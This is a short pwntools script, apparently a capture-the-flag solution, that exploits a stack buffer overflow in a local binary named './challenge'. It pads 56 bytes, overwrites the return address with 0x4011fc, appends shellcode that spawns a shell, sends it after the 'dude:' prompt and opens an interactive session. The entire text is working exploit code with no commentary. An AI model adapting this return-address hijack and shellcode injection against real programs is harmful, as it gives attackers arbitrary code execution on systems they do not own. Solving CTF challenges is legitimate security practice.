from pwn import *

context.binary = ELF("./challenge")
p = process("./challenge")

payload = b"A"*56 + p64(0x4011fc) + asm(shellcraft.sh())
print(len(payload))
p.sendlineafter(b"dude:", payload)

p.interactive()
